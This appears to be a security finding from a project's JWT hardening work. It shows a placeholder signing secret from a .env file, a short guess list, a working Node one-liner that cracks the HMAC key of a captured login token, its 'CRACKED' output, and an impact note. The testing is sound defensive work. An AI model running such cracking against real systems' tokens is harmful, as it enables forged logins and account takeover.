# ATTACK 01 — Crack the weak JWT secret

# Target: the token issued by /api/users/login
# Goal: recover the HMAC signing key from a captured token
# Expected (secure): 256-bit random key -> not recoverable
# Actual (this run): the key is a public placeholder and is recovered

## 1. The secret stored in backend/.env
JWT_SECRET=your_jwt_secret_key

## 2. Wordlist used for the offline guess
your_jwt_secret_key
secret
jwt_secret
changeme
password
1234

## 3. Command (executed from backend/)
node -e "const jwt=require('jsonwebtoken');const fs=require('fs');const path=require('path');const t=process.argv[1];const p=path.resolve('../docs/findings/05-jwt-auth-hardening/wordlist.txt');const words=fs.readFileSync(p,'utf8').split(/\r?\n/).filter(Boolean);for(const w of words){try{jwt.verify(t,w);console.log('CRACKED:',w);process.exit(0);}catch(e){console.log('tried:',w,'->',e.message);}}console.log('NOT FOUND');" $TOKEN

## 4. Output
CRACKED: your_jwt_secret_key

## 5. Interpretation
The signing key was recovered from a captured user token in under one
second using a 6-word list. Any attacker who obtains a single token
(for example via XSS, leaked logs, or a shared screenshot) can now sign
their own tokens for any user or admin account.
